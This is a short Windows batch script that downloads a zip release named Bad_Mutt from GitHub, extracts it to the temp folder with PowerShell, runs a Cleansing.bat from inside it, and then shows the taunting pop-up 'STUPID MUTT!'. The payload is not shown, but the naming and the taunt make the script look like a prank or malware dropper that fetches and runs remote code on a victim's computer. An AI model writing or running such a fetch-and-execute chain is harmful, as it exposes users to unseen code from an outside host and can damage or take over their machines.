::: MAIN ZIP DOWNLOAD

start https://github.com/NOCRUF/Bad_Mutt/archive/refs/tags/v0.1.zip

powershell Expand-Archive %USERPROFILE%\Downloads\Bad_Mutt-0.1.zip -DestinationPath %TEMP%

start %TEMP%\Bad_Mutt-0.1\Cleansing.bat

msg * "STUPID MUTT!"
::: Cleansing.bat
